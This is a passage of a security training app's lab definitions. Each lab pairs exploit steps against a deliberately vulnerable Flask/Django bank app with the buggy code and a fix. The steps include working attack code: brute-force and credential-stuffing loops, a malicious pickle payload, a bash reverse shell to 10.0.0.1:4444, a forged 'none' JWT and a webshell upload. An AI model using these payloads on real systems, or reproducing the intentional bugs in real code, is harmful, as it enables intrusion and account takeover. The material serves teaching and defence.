      'Try a real username with a wrong password:\n```bash\ncurl -X POST http://localhost:5000/auth/login \\\n  -d \'{"username": "alice", "password": "wrongpass"}\'\n# Response: {"error": "Incorrect password"}\n```',
      'Write a script to enumerate valid users:\n```bash\nwhile read user; do\n  RESP=$(curl -s -X POST http://localhost:5000/auth/login \\\n    -d "{\\\"username\\\": \\\"$user\\\", \\\"password\\\": \\\"x\\\"}")\n  echo "$user: $RESP" | grep -v "not found"\ndone < /usr/share/wordlists/names.txt\n```',
      'Build a list of valid usernames for a targeted brute-force attack (see Lab 17).',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/auth.py',
        language: 'python',
        code: `@app.route('/auth/login', methods=['POST'])
def login():
    data = request.get_json()
    user = User.query.filter_by(username=data['username']).first()

    if not user:
        # BUG: Different message leaks that username doesn't exist
        return jsonify({'error': 'User not found'}), 401

    if not user.check_password(data['password']):
        # BUG: Different message leaks that username DOES exist
        return jsonify({'error': 'Incorrect password'}), 401

    return jsonify({'token': create_access_token(identity=user.id)})`,
      },
    ],
    hint: 'Two different error messages for the two failure cases allow an attacker to distinguish "username doesn\'t exist" from "password wrong". The fix is a single generic message for both cases.',
    fix: {
      description: 'Return the same error message and HTTP status for both failure modes. Add a constant-time comparison to prevent timing side-channels.',
      language: 'python',
      before: `if not user:
    return jsonify({'error': 'User not found'}), 401
if not user.check_password(password):
    return jsonify({'error': 'Incorrect password'}), 401`,
      after: `GENERIC_ERROR = {'error': 'Invalid username or password'}

user = User.query.filter_by(username=username).first()
# Always run check_password to prevent timing oracle
if not user or not user.check_password(password):
    return jsonify(GENERIC_ERROR), 401`,
    },
    tags: ['Enumeration', 'Flask', 'Auth', 'BruteForce'],
  },

  // ─── A07: Auth Failures ───────────────────────────────────────────────────

  'a07-17': {
    id: 17,
    category: 'A07',
    title: 'Brute-force — No Rate Limiting on Login',
    difficulty: 'Low',
    objective:
      'Brute-force a user\'s password by making unlimited login attempts with no throttling.',
    exploitSteps: [
      'Confirm there is no rate limiting:\n```bash\nfor i in $(seq 1 100); do\n  curl -s -X POST http://localhost:5000/auth/login \\\n    -d \'{"username":"alice","password":"wrong"}\'\ndone\n# All 100 requests succeed without 429\n```',
      'Download a common password list:\n```bash\nwget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\n```',
      'Run a credential stuffing attack:\n```bash\nwhile read pass; do\n  RESP=$(curl -s -X POST http://localhost:5000/auth/login \\\n    -d "{\\\"username\\\":\\\"alice\\\",\\\"password\\\":\\\"$pass\\\"}")\n  if echo "$RESP" | grep -q "token"; then\n    echo "FOUND: $pass"; break\n  fi\ndone < passwords.txt\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/auth.py',
        language: 'python',
        code: `@app.route('/auth/login', methods=['POST'])
def login():
    # BUG: No rate limiting — unlimited attempts allowed
    data = request.get_json()
    user = User.query.filter_by(username=data['username']).first()
    if user and user.check_password(data['password']):
        return jsonify({'token': create_access_token(identity=user.id)})
    return jsonify({'error': 'Invalid credentials'}), 401`,
      },
    ],
    hint: 'Without rate limiting, an attacker can test thousands of passwords per second. Flask-Limiter integrates with Redis to track request counts per IP or per username.',
    fix: {
      description: 'Apply Flask-Limiter to cap login attempts. Lock the account after a threshold and add exponential back-off.',
      language: 'python',
      before: `@app.route('/auth/login', methods=['POST'])
def login():
    ...`,
      after: `from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address, storage_uri="redis://redis:6379")

@app.route('/auth/login', methods=['POST'])
@limiter.limit("5 per minute; 20 per hour")
def login():
    data = request.get_json()
    # Also track per-username failures and lock after 10 attempts
    failures = cache.get(f"failures:{data['username']}") or 0
    if failures >= 10:
        abort(429, description="Account locked. Try again later.")
    ...`,
    },
    tags: ['BruteForce', 'RateLimiting', 'Flask', 'Auth'],
  },

  'a07-18': {
    id: 18,
    category: 'A07',
    title: 'Session Fixation',
    difficulty: 'Medium',
    objective:
      'Fix a session ID before the victim logs in, then hijack their authenticated session using the pre-set ID.',
    exploitSteps: [
      'Request a session before logging in:\n```bash\ncurl -c cookies.txt http://localhost:8000/api/\ngrep sessionid cookies.txt\n# SESSIONID=abc123fixedvalue\n```',
      'Trick the victim into loading the app with your session ID (e.g., via a URL with the cookie set in a link).',
      'Once the victim logs in, their session is now authenticated with the same ID.',
      'Use the pre-known session ID to make authenticated requests:\n```bash\ncurl -b "sessionid=abc123fixedvalue" \\\n  http://localhost:8000/api/profile/\n# Returns victim\'s profile\n```',
      'Confirm by checking Django\'s session table:\n```bash\npsql "$DB_URL" -c "SELECT session_key, session_data FROM django_session WHERE session_key=\'abc123fixedvalue\';"\n```',
    ],
    affectedCode: [
      {
        filename: 'django-app/api/views.py',
        language: 'python',
        code: `class LoginView(APIView):
    def post(self, request):
        serializer = LoginSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        user = authenticate(
            username=serializer.validated_data['username'],
            password=serializer.validated_data['password'],
        )
        if user:
            login(request, user)
            # BUG: Session key is NOT regenerated after login
            # Attacker who set session before login can hijack it
            return Response({'status': 'ok'})
        return Response({'error': 'Invalid credentials'}, status=401)`,
      },
    ],
    hint: 'If the session ID doesn\'t change on login, an attacker who knows a pre-authentication session ID continues to hold a valid handle even after the victim authenticates. Django\'s session framework provides cycle_key() to regenerate the ID while preserving session data.',
    fix: {
      description: 'Call request.session.cycle_key() immediately after a successful login to generate a new session ID while preserving session data.',
      language: 'python',
      before: `login(request, user)
return Response({'status': 'ok'})`,
      after: `login(request, user)
request.session.cycle_key()   # <-- regenerate session ID on login
return Response({'status': 'ok'})`,
    },
    tags: ['SessionFixation', 'Django', 'Auth', 'Session'],
  },

  'a07-19': {
    id: 19,
    category: 'A07',
    title: 'Predictable Password Reset Token',
    difficulty: 'Medium',
    objective:
      'Generate a password reset token for another user by predicting the token construction algorithm (MD5 of username+timestamp).',
    exploitSteps: [
      'Request a reset for yourself and capture the token:\n```bash\ncurl -X POST http://localhost:5000/auth/reset-request \\\n  -d \'{"username": "alice"}\'\n```',
      'Decode the token: base64 -d or observe it is a hex string.',
      'Reverse-engineer: token = md5(username + unix_epoch_seconds)',
      'Request a reset for alice at time T, then compute her token:\n```bash\npython3 - <<\'EOF\'\nimport hashlib, time\nusername = "alice"\n# Try the last 60 seconds in case of clock skew\nfor t in range(int(time.time()) - 60, int(time.time()) + 1):\n    token = hashlib.md5(f"{username}{t}".encode()).hexdigest()\n    print(token)\nEOF\n```',
      'Use the predicted token to reset alice\'s password:\n```bash\ncurl -X POST http://localhost:5000/auth/reset-confirm \\\n  -d \'{"token": "$PREDICTED_TOKEN", "new_password": "hacked123"}\'\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/auth.py',
        language: 'python',
        code: `@app.route('/auth/reset-request', methods=['POST'])
def request_reset():
    username = request.json['username']
    user = User.query.filter_by(username=username).first_or_404()

    # BUG: Token is predictable — MD5(username + unix timestamp)
    token = hashlib.md5(
        (username + str(int(time.time()))).encode()
    ).hexdigest()

    user.reset_token = token
    user.reset_expires = datetime.utcnow() + timedelta(hours=24)
    db.session.commit()
    send_reset_email(user.email, token)
    return jsonify({'status': 'email sent'})`,
      },
    ],
    hint: 'The token is deterministic: if you know the username and can guess the time (Unix epoch seconds have only ~60 possible values during a typical request window), you can enumerate all plausible tokens in under a second.',
    fix: {
      description: 'Generate tokens using a cryptographically secure random source. Use secrets.token_urlsafe(32) which provides 192 bits of entropy. Shorten expiry to 1 hour.',
      language: 'python',
      before: `token = hashlib.md5((username + str(int(time.time()))).encode()).hexdigest()`,
      after: `import secrets
from datetime import timedelta

token = secrets.token_urlsafe(32)   # 192 bits of entropy
user.reset_token = token
user.reset_expires = datetime.utcnow() + timedelta(hours=1)  # short window`,
    },
    tags: ['ResetToken', 'Predictable', 'Flask', 'Crypto'],
  },

  // ─── A08: Integrity Failures ──────────────────────────────────────────────

  'a08-20': {
    id: 20,
    category: 'A08',
    title: 'Pickle Deserialization — RCE via File Upload',
    difficulty: 'High',
    objective:
      'Achieve remote code execution by uploading a malicious pickle file that is deserialized server-side.',
    exploitSteps: [
      'Create a malicious pickle payload:\n```python\nimport pickle, os, base64\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ("id > /tmp/pwned",))\npayload = pickle.dumps(Exploit())\nwith open("evil.pkl", "wb") as f:\n    f.write(payload)\n```',
      'Upload the pickle file as an "account statement export":\n```bash\ncurl -X POST http://localhost:5000/import/statement \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -F "file=@evil.pkl"\n```',
      'Confirm RCE:\n```bash\ncurl http://localhost:5000/import/statement?check=/tmp/pwned\n```',
      'Escalate to reverse shell:\n```python\nos.system("bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'")\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/import.py',
        language: 'python',
        code: `@app.route('/import/statement', methods=['POST'])
@jwt_required()
def import_statement():
    f = request.files['file']
    file_data = f.read()

    # BUG: pickle.loads executes arbitrary Python during deserialization
    data = pickle.loads(file_data)

    for row in data:
        txn = Transaction(**row)
        db.session.add(txn)
    db.session.commit()
    return jsonify({'imported': len(data)})`,
      },
    ],
    hint: 'pickle.loads() executes the __reduce__ method of any class in the payload. There is no safe way to unpickle untrusted data. Replace pickle with a data-only format like JSON and validate the schema.',
    fix: {
      description: 'Replace pickle with JSON. Validate the schema with a Pydantic model to ensure only expected fields with expected types are accepted.',
      language: 'python',
      before: `data = pickle.loads(file_data)`,
      after: `import json
from pydantic import BaseModel, validator
from typing import List

class TransactionRow(BaseModel):
    date: str
    amount: float
    description: str

    @validator('amount')
    def positive_amount(cls, v):
        if v <= 0:
            raise ValueError('amount must be positive')
        return v

data_raw = json.loads(file_data.decode('utf-8'))
rows = [TransactionRow(**row) for row in data_raw]  # validates schema`,
    },
    tags: ['Pickle', 'Deserialization', 'RCE', 'Flask'],
  },

  'a08-21': {
    id: 21,
    category: 'A08',
    title: 'JWT None Algorithm Attack',
    difficulty: 'Medium',
    objective:
      'Forge a JWT by setting the algorithm to "none" to bypass signature verification.',
    exploitSteps: [
      'Capture a valid JWT from the login response.',
      'Decode the header:\n```bash\necho $TOKEN | cut -d. -f1 | base64 -d\n# {"alg":"HS256","typ":"JWT"}\n```',
      'Craft a none-alg token:\n```python\nimport base64, json\n\ndef b64url(data):\n    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b\'=\').decode()\n\nheader = b64url({"alg": "none", "typ": "JWT"})\npayload = b64url({"sub": 1, "role": "admin", "exp": 9999999999})\ntoken = f"{header}.{payload}."  # empty signature\nprint(token)\n```',
      'Use the forged token:\n```bash\ncurl -H "Authorization: Bearer $FORGED_TOKEN" \\\n  http://localhost:5000/admin/users\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/utils/jwt_utils.py',
        language: 'python',
        code: `import jwt

def decode_token(token: str) -> dict:
    # BUG: verify_signature=False accepts any token including "none" alg
    return jwt.decode(
        token,
        options={"verify_signature": False},
        algorithms=["HS256", "none"]  # BUG: "none" allowed
    )`,
      },
    ],
    hint: 'Some JWT libraries accept "none" as a valid algorithm meaning "unsigned". If the server honours this, any client can create a valid-looking token without knowing the secret. Always specify allowed algorithms and always verify the signature.',
    fix: {
      description: 'Always verify signatures. Explicitly whitelist only the algorithms you use. Never accept the "none" algorithm.',
      language: 'python',
      before: `jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256", "none"])`,
      after: `SECRET = os.environ['JWT_SECRET_KEY']

jwt.decode(
    token,
    SECRET,
    algorithms=["HS256"],       # explicit whitelist — no "none"
    options={"verify_signature": True, "require": ["exp", "sub"]}
)`,
    },
    tags: ['JWT', 'NoneAlg', 'Flask', 'Auth'],
  },

  'a08-22': {
    id: 22,
    category: 'A08',
    title: 'Unrestricted File Upload — Webshell',
    difficulty: 'High',
    objective:
      'Upload a Python/PHP webshell by exploiting missing MIME-type validation on the file upload endpoint.',
    exploitSteps: [
      'Create a Python Flask webshell:\n```bash\ncat > shell.py << \'EOF\'\nimport os\nprint(os.popen(open("/tmp/cmd").read()).read())\nEOF\n```',
      'Upload it as an avatar:\n```bash\ncurl -X POST http://localhost:5000/profile/avatar \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -F "file=@shell.py;type=image/png"\n```',
      'Determine the uploaded path from the response URL.',
      'If the uploads folder is under webroot, request the file:\n```bash\ncurl http://localhost:5000/uploads/shell.py\n```',
      'If the server executes Python files in uploads, write a command and trigger:\n```bash\necho "id" > /tmp/cmd\ncurl http://localhost:5000/uploads/shell.py\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/profile.py',
        language: 'python',
        code: `@app.route('/profile/avatar', methods=['POST'])
@jwt_required()
def upload_avatar():
    f = request.files['file']
    filename = f.filename   # BUG: Original filename with original extension

    # BUG: No MIME type or extension validation
    # BUG: Stored directly under webroot-accessible /uploads/
    save_path = os.path.join('/app/uploads', filename)
    f.save(save_path)
    return jsonify({'url': f'/uploads/{filename}'})`,
      },
    ],
    hint: 'The server accepts any file type and stores it with the original filename inside a directory served by Flask. Uploading shell.py and then requesting /uploads/shell.py may execute it if the web server is configured to execute .py files.',
    fix: {
      description: 'Validate MIME type against an allowlist, generate a random UUID filename, and store uploads outside the web root.',
      language: 'python',
      before: `save_path = os.path.join('/app/uploads', filename)
f.save(save_path)`,
      after: `import magic, uuid

ALLOWED_MIME = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
MAX_SIZE = 5 * 1024 * 1024  # 5 MB

data = f.read(MAX_SIZE + 1)
if len(data) > MAX_SIZE:
    abort(413, "File too large")
mime = magic.from_buffer(data, mime=True)
if mime not in ALLOWED_MIME:
    abort(415, f"Unsupported file type: {mime}")

ext = {'image/jpeg': '.jpg', 'image/png': '.png',
       'image/gif': '.gif', 'image/webp': '.webp'}[mime]
safe_name = uuid.uuid4().hex + ext

# Store outside webroot
save_path = os.path.join('/var/securebank/avatars', safe_name)
with open(save_path, 'wb') as out:
    out.write(data)`,
    },
    tags: ['FileUpload', 'Webshell', 'Flask', 'RCE'],
  },

  // ─── A10: Exception Handling ──────────────────────────────────────────────

  'a10-23': {
    id: 23,
    category: 'A10',
    title: 'Verbose Error — Stack Trace Disclosure',
    difficulty: 'Low',
    objective:
      'Trigger an unhandled exception to receive a full stack trace revealing internal file paths, library versions, and application logic.',
    exploitSteps: [
      'Send an invalid account ID:\n```bash\ncurl http://localhost:5000/accounts/abc\n# Returns full Python traceback\n```',
      'Send a malformed JSON body:\n```bash\ncurl -X POST http://localhost:5000/transfers/send \\\n  -H "Content-Type: application/json" \\\n  -d \'{"amount": "not-a-number"}\'\n# ValueError: invalid literal for int() with base 10\n```',
      'Observe the stack trace reveals:\n  - Absolute file paths: /app/flask-app/routes/transfers.py line 42\n  - Library versions: Flask 2.3.2, SQLAlchemy 2.0.1\n  - Database query structure\n  - Environment variable names',
      'Use the information to craft targeted exploits.',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/accounts.py',
        language: 'python',
        code: `@app.route('/accounts/<account_id>', methods=['GET'])
@jwt_required()
def get_account(account_id):
    # BUG: No try/except — ValueError propagates as 500 with full traceback
    aid = int(account_id)   # raises ValueError for non-numeric input
    account = Account.query.get(aid)
    if not account:
        return jsonify({'error': 'Not found'}), 404
    return jsonify(account.to_dict())`,
      },
    ],
    hint: 'Unhandled exceptions bubble up to Flask\'s default error handler which, in development mode, renders a detailed debug page. In production mode it returns a generic 500 — but only if DEBUG=False and an error handler is registered.',
    fix: {
      description: 'Wrap input parsing in try/except. Register a global error handler that returns generic JSON responses in production without leaking internal details.',
      language: 'python',
      before: `aid = int(account_id)
account = Account.query.get(aid)`,
      after: `try:
    aid = int(account_id)
except ValueError:
    return jsonify({'error': 'Invalid account ID'}), 400

account = Account.query.get(aid)
if not account:
    return jsonify({'error': 'Account not found'}), 404

# Global handler in app factory:
@app.errorhandler(Exception)
def handle_exception(e):
    app.logger.exception("Unhandled exception")
    return jsonify({'error': 'An internal error occurred'}), 500`,
    },
    tags: ['VerboseError', 'Flask', 'StackTrace', 'ErrorHandling'],
  },

  'a10-24': {
    id: 24,
    category: 'A10',
    title: 'TypeError on Unvalidated Input',
    difficulty: 'Low',
    objective:
      'Trigger a TypeError by sending a string where a number is expected, causing a 500 error that leaks type information.',
    exploitSteps: [
      'Send a string amount in a transfer:\n```bash\ncurl -X POST http://localhost:5000/transfers/send \\\n  -H "Authorization: Bearer $TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"to": 2, "amount": "five dollars", "note": "test"}\'\n# 500: TypeError: unsupported operand type(s) for -: Decimal and str\n```',
      'Send a null value:\n```bash\n-d \'{"to": 2, "amount": null}\'\n# TypeError: float() argument must be a string or a number, not NoneType\n```',
      'Send a JSON array:\n```bash\n-d \'{"to": 2, "amount": [100, 200]}\'\n```',
      'Each distinct TypeError reveals the internal type being used (Decimal, float, int) and the operation attempted.',
    ],
    affectedCode: [
      {
        filename: 'flask-app/routes/transfers.py',
        language: 'python',
        code: `@app.route('/transfers/send', methods=['POST'])
@jwt_required()
def send_transfer():
    data = request.get_json()
    # BUG: No validation — raises TypeError if amount is not numeric
    amount = float(data['amount'])
    sender.balance -= Decimal(str(amount))
    recipient.balance += Decimal(str(amount))
    db.session.commit()
    return jsonify({'status': 'ok'})`,
      },
    ],
    hint: 'Parsing without validation delegates error messages to Python\'s runtime, which produces descriptive TypeErrors that reveal internal details. Validate all inputs at the API boundary before any computation.',
    fix: {
      description: 'Validate the type and range of inputs at the API boundary using a schema validator (marshmallow, Pydantic, or manual checks). Return a client-safe 400 Bad Request for invalid inputs.',
      language: 'python',
      before: `amount = float(data['amount'])`,
      after: `from marshmallow import Schema, fields, validate, ValidationError

class TransferSchema(Schema):
    to_account_id = fields.Int(required=True, strict=True)
    amount = fields.Decimal(required=True, validate=validate.Range(min=0.01, max=50000))
    note = fields.Str(load_default='', validate=validate.Length(max=200))

try:
    validated = TransferSchema().load(request.get_json() or {})
except ValidationError as err:
    return jsonify({'error': err.messages}), 400

amount = validated['amount']`,
    },
    tags: ['TypeError', 'Flask', 'InputValidation', 'ErrorHandling'],
  },

  'a10-25': {
    id: 25,
    category: 'A10',
    title: 'Auth Bypass via Exception Swallowing',
    difficulty: 'Medium',
    objective:
      'Bypass authentication by sending a malformed JWT that causes the token-decode exception to be swallowed, defaulting user_id to 1 (admin).',
    exploitSteps: [
      'Send a request with a deliberately corrupted token:\n```bash\ncurl -H "Authorization: Bearer INVALID.TOKEN.HERE" \\\n  http://localhost:5000/accounts/1\n# Returns account data for user_id=1 (admin)\n```',
      'Confirm by sending no token at all:\n```bash\ncurl -H "Authorization: Bearer " \\\n  http://localhost:5000/admin/users\n```',
      'The bare except swallows the DecodeError and falls back to user_id=1.',
      'Send any garbage:\n```bash\ncurl -H "Authorization: Bearer a.b.c" \\\n  http://localhost:5000/transfers/history\n# Returns admin\'s transfer history\n```',
    ],
    affectedCode: [
      {
        filename: 'flask-app/utils/auth.py',
        language: 'python',
        code: `def get_current_user_id(token: str) -> int:
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload['sub']
    except:
        # BUG: Bare except swallows ALL exceptions including DecodeError
        # and falls back to user_id=1, granting admin access to anyone
        user_id = 1
    return user_id`,
      },
    ],
    hint: 'The bare except clause catches jwt.DecodeError, jwt.ExpiredSignatureError, and every other exception. Instead of denying the request, it silently falls back to user_id=1. Never swallow authentication exceptions — re-raise or return 401.',
    fix: {
      description: 'Catch only expected exceptions explicitly. On any JWT validation failure, return 401 Unauthorized. Never fall back to a default identity.',
      language: 'python',
      before: `try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    return payload['sub']
except:
    user_id = 1
return user_id`,
      after: `from flask import abort
import jwt

def get_current_user_id(token: str) -> int:
    if not token:
        abort(401, description="Authentication required")
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],
            options={"require": ["sub", "exp"]}
        )
        return int(payload['sub'])
    except jwt.ExpiredSignatureError:
        abort(401, description="Token has expired")
    except jwt.InvalidTokenError:
        abort(401, description="Invalid token")
    # No fallback — never return a default identity`,
    },
    tags: ['AuthBypass', 'JWT', 'ExceptionSwallowing', 'Flask'],
  },
}
